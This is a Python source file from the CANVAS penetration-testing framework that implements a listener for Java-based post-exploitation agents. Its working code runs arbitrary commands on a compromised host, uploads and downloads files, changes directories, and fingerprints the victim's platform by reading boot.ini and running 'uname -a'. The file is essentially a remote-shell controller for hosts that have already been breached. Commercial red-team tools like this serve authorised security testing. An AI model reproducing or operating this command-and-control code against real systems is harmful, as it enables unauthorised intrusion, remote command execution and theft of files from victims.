#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

"""
phplistener.py

Listener for connections to PHP servers

"""
import os, sys
from shellserver import shellserver
from canvaserror import *

from exploitutils import *
import time
from libs.canvasos import canvasos
from canvaserror import *


class javalistener(shellserver):
    def __init__(self, connection , logfunction=None):
        devlog("javalistener","New Java listener connection:%s"%connection)
        self.engine=None
        self.sent_init_code=False
        shellserver.__init__(self,connection,type="Active",logfunction=logfunction)
        self.connection=connection #already done, but let's make it here as well
        self.na="This is a Java listener - that command is not supported"
    
    def startup(self):
        """
        Our first stage already loops, so we should be good to go on that.
        """
        return 
    
    def sendraw(self,buf):
        """
        send data to the remote side - reliable
        """
        self.connection.sendall(buf)
        return 
    
    def send_buf(self,buf):
        """
        send data block to remote side
        """
        self.sendraw(big_order(len(buf)))
        self.sendraw(buf)
        return 
    
    def read_string(self):
        """
        Read a string from the remote side
        """
        size=str2bigendian(reliablerecv(self.connection,4))
        if size>0xfffff:
            self.log("Garbled size value %x"%size)
            return ""
        devlog("javalistener","Reading data: %d bytes"%size)
        dataarray=[]
        if size==0:
            return ""
        gotsize=0
        while gotsize<size:
            data=self.connection.recv(size)
            dataarray+=[data]
            gotsize+=len(data)
        return "".join(dataarray)
    
    def send_command(self, command, args=None):
        """
        Sends a command to the remove side. 
        Format is:
        <size of args in bytes><command as big endian 32 bit integer><args>        
        """
        if args==None:
            args=""
        self.sendraw(big_order(len(args)))
        self.sendraw(big_order(command))
        self.sendraw(args)
        return
        
    def pwd(self):
        """
        Get current working directory
        """
        
        self.send_command(1)
        ret=self.read_string()
        return ret

    def getcwd(self):
        return self.pwd()
    
    def runcommand(self,command):
        """
        Running a command is easy with a shell
        """
        #escape quotes        
        self.send_command(3,command)
        ret=self.read_string()
        return ret
    
    def shellcommand(self, command, LFkludge=False):
        """The UnixShellNode style interface, which returns the process exit code as well as the output. This isn't supported by
        javaNode.java, but should be. For now, we kludge. It's no worse than what runcommand does :(
        """
        x = self.runcommand(command)
        if len(x) > 1:
            rv = 0 
        else:
            rv = 1
            
        return (x, rv)
    
    def dospawn(self,command):
        return ""
    
    def dounlink(self,filename):
        return self.na
    
    def cd(self,directory):
        self.log("Changing directory to %s"%directory)
        self.send_command(2,directory) #no confirmation from this one
        return "Changed directory to %s"%directory
    
    def chdir(self,directory):
        return self.cd(directory)
    
    def dodir(self,directory):
        return self.na
    
    def upload(self,source,dest=".",destfilename=None):
        try:
            fp = file(source,"rb")
            data = fp.read()
            fp.close()
        except IOError, i:
            e = "Error reading local file: %s" % str(i)
            self.log(e)
            raise NodeCommandError(e)
        
        self.log("Sending %d bytes to %s"%(len(data),dest))
        # Given that this code looks like it's never been tested, how do we know we need this :)
        #self.cd(dest)
        
        if not destfilename:
            destfilename= dest + "/" + strip_leading_path(source)
        else:
            if len(dest) and dest[-1] not in "\\/":                
                dest += "/" 
                
            destfilename = dest + destfilename
            
        request=big_order(len(destfilename))+destfilename+data 
        self.send_command(4,request)
        self.log("File sent")
        
        return "Uploaded %d bytes from %s into %s" % (len(data), source, destfilename)
    
    def download(self,source,dest="."):
        ret = ""
        rv = True
        
        if os.path.isdir(dest):
            dest=os.path.join(dest,source.replace("/","_").replace("\\","_"))
        
        try:
            outfile=open(dest,"wb")
        except IOError, i:
            e = "Failed to open local file: %s" % str(i)
            self.log(e)
            rv = False
            ret = e
        
        if rv:
            self.send_command(5,source)
            data=self.read_string()
            self.log("Got %d bytes"%len(data))            
            
            try:
                outfile.write(data)
                outfile.close()
                rv = True            
                ret = "Read %d bytes of data into %s"%(len(data),dest)
                self.log(ret)
                    
            except IOError,i:
                e = "Error writing to local file: %s" % str(i)
                self.log(e)
                ret = e
                rv = False
            
        if not rv:
            raise NodeCommandError(ret)
        
        return ret
    
    def get_shell(self):
        """
        spawn telnet client with remote end hooked to it
        TODO
        """
        pass
    
    def getPlatformInfo(self):
        if getattr(self, "failedDismallyAtPlatformInfo", False):
            return None
        
        # What about windows? XXX: implement boot.ini grabbing.
        s = self.runcommand("cmd /c type %SYSTEMDRIVE%\\boot.ini")
        
        if len(s) == 0:
            s = self.runcommand("cmd /c ver")            
        
        if len(s) == 0:
            s = self.runcommand("uname -a")
            
        

        if len(s) == 0:
            self.log("Failed to get PlatformInfo")
            self.failedDismallyAtPlatformInfo = True
            return None
    
        self.log("Got platformInfo: %s" % s)
        self.uname = s
        os = canvasos()
        os.load_uname(s)
        ret = os
            
        return ret

        
if __name__=="__main__":
    p=javalistener()
